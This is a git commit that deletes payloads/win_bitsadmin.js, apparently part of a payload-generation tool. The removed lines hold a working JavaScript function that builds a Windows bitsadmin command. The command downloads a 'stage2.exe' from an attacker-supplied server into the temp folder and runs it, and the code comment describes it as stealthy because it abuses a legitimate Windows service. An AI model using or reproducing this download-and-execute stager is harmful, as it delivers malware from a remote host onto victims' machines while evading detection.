6d5ddd2974cc8b29b9453faa14422dd0f852989b
Anonymous 🎭 <157519745+anonymous-beta@users.noreply.github.com>
2026-08-02 10:05:59 +0100

    Delete payloads/win_bitsadmin.js

--- payloads/win_bitsadmin.js
+++
@@ -1,6 +0,0 @@
-function generate(token, serverUrl) {
-    // Downloads via bitsadmin (stealthy, uses legit Windows service)
-    return `bitsadmin /transfer h${token} /download /priority normal "${serverUrl}/stage2.exe" %TEMP%\\h_${token}.exe && start %TEMP%\\h_${token}.exe`;
-}
-
-module.exports = { generate };
